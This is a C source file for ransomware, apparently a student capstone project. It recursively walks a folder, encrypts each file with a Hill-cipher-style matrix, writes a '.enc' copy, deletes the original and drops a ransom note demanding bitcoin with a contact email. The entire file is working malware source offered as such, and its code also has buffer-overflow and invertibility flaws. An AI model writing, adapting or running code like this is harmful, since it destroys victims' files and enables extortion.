#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <errno.h>

#define MAX_FILENAME_LENGTH 256
#define MAX_KEY_LENGTH 16

void ls_dir(char* start_path);
void encryptfile(FILE* fpin, FILE* fpout, unsigned char* key);

int main()
{
    char* start_path = "C:\\newfolder\\capstone";
    ls_dir(start_path);

    return 0;
}

void ls_dir(char* start_path)
{

    /*
    Recursively searches for all files and directories present in the specified directory and its subdirectories. 
    For all the files, checks if the file extension is ".enc". If not, then opens the file, creates a new file with the same name and ".enc" extension, writes a predefined message in a file named "RANSOMEWARE_INFO", encrypts the file content using Hill Cipher encryption algorithm and deletes the original file.

    :param start_path: a pointer to a character array that represents the path of the directory to be searched.
    */

    unsigned char key[MAX_KEY_LENGTH] = "INFECTED";// 16 char key
    DIR* dir;
    struct dirent *ent;
    
    // Loop through all files in the directory
    if((dir = opendir(start_path)) != NULL)
    {
        while((ent = readdir(dir)) != NULL)
        {
            int len = strlen(ent->d_name);
            const char* last_four = &ent->d_name[len-4];
            
            // Check if file is not already encrypted and is a regular file
            if(strcmp(last_four,".enc") != 0)
            {
                if(ent->d_type == DT_REG)
                {

                    char* full_path_readme =(char*) malloc(strlen("RANSOMEWARE_INFO")+strlen(start_path)+2);
                    strcpy(full_path_readme,start_path);
                    strcat(full_path_readme,"RANSOMEWARE_INFO");
                    
                     // Define full paths for the file to be encrypted and the new encrypted file
                    char full_path[MAX_FILENAME_LENGTH];
                    strcpy(full_path, start_path);

                    strcat(full_path,"\\");
                    strcat(full_path, ent->d_name);
                    char new_name[MAX_FILENAME_LENGTH];
                    strcpy(new_name, full_path);
                    strcat(new_name, ".enc");
                    
                    // Check if the file path is not a critical system file path
                    if(strcmp(full_path,"C:\\Windows\\System32\\config\\SAM") !=0 && strcmp(full_path,"C:\\Windows\\System32\\config\\SECURITY")!=0 && strcmp(full_path,"C:\\Windows\\System32\\config\\SOFTWARE") !=0)
                    {
                        
                        // Open the file to be encrypted, the new encrypted file, and a file to hold the ransom note
                        FILE* fpin;
                        FILE* fpout;
                        FILE* fpreadme;
                        fpin=fopen(full_path,"rb");
                        fpout=fopen(new_name,"wb");
                        fpreadme=fopen(full_path_readme,"w");
                        fprintf(fpreadme,"You have been HACKED! \n\n Here All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Transfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:qwertyuiopasdfghjkl\n Email:infected02capstone@gmail.com \n");

                        encryptfile(fpin, fpout, key);

                        fclose(fpin);
                        fclose(fpout);
                        fclose(fpreadme);
                        //Delete the original file.
                        int a=remove(full_path);
                    }
                }
                // If file is a directory, recursively call this function on that directory
                else if(ent->d_type == DT_DIR)
                {
                    char full_path[MAX_FILENAME_LENGTH];
                    strcpy(full_path, start_path);
                    strcat(full_path,"\\");
                    strcat(full_path, ent->d_name);
                    strcat(full_path, "\\");
                    if(full_path != start_path && ent->d_name[0] != '.')
                    {
                        ls_dir(full_path);
                    }
                }
            }
        }
        closedir(dir);
    }
}


void encryptfile(FILE* fpin, FILE* fpout, unsigned char* key)
{

    /*
    Reads the contents from fpin, encrypts using Hill Cipher and writes the cipher text into only into first 4096 bytes of fpout.

    :param start_path: a pointer to a character array that represents the path of the directory to be searched.
    :param fpin: a pointer to the input file.
    :param fpout: a pointer to the output file.
    :param key: an array of unsigned characters that represents the encryption key.
    */

    // Using Hill Cipher to encrypt a file
    int k = strlen(key);

    // Generate the encryption matrix
    int matrix_size = k;
    int matrix[matrix_size][matrix_size];
    for (int i = 0; i < matrix_size; i++) {
        for (int j = 0; j < matrix_size; j++) {
            matrix[i][j] = key[(i + j) % k] - 'A';
        }
    }
    
    const unsigned bufsize = 4096;
    // Set up buffer for reading from file and writing encrypted data into file
    unsigned char* read_buf = malloc(bufsize);
    unsigned char* write_buf = malloc(bufsize);
    size_t bytes_read;
    int i, j, sum;
    int write_index = 0;

    if (fpin == NULL || fpout == NULL) {
        printf("Error: failed to open file.\n");
        return;
    }
    
    // Read from the input file in chunks and encrypt each chunk
    while ((bytes_read = fread(read_buf, sizeof(unsigned char), bufsize, fpin)) > 0) {
        for (i = 0; i < bytes_read; i += matrix_size) {
            
            // Multiply the current chunk of input data by the encryption matrix
            for (j = 0; j < matrix_size; j++) {
                sum = 0;
                for (int k = 0; k < matrix_size; k++) {
                    if (i + k < bytes_read) {
                        sum += matrix[j][k] * read_buf[i + k];
                    }
                }
                write_buf[write_index++] = (unsigned char)(sum % 256);
            }
        }
        fwrite(write_buf, sizeof(unsigned char), write_index, fpout);
        write_index = 0;
    }
    free(read_buf);
    free(write_buf);
}
